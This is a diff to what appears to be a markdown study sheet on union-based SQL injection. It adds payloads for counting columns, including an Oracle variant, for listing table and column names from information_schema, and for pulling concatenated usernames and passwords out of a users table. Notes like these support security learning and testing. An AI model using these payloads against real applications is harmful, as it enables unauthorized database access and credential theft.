@@ -50,11 +50,16 @@ When results show on web page like product list page, we need to test the union 
 When found union base SQL injection, find number of columns exists in table
 - Determine the number of columns of current query
 ```
-UNION SELECT NULL --
+' UNION SELECT NULL --
+```
+
+Oracle
+```
+' UNION SELECT NULL FROM all_tables --
 ```
 
 ```
- ' ORDER BY 20 --
+ ' ORDER BY 5 --
 ```
 
 - Determine the datatype of the column
@@ -78,6 +83,16 @@ Oracle
 Finding table names
 ```
 ' UNION SELECT table_name, NULL FROM information_schema.tables --
+```
+
+Finding column names
+```
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
+```
+
+Extracting multiple columns data from single query column
+```
+' UNION SELECT NULL, username|| '~' ||password FROM users --
 ```
 ### Error base SQL injection
 It is a technique if SQL injection vulnerability exists or not.
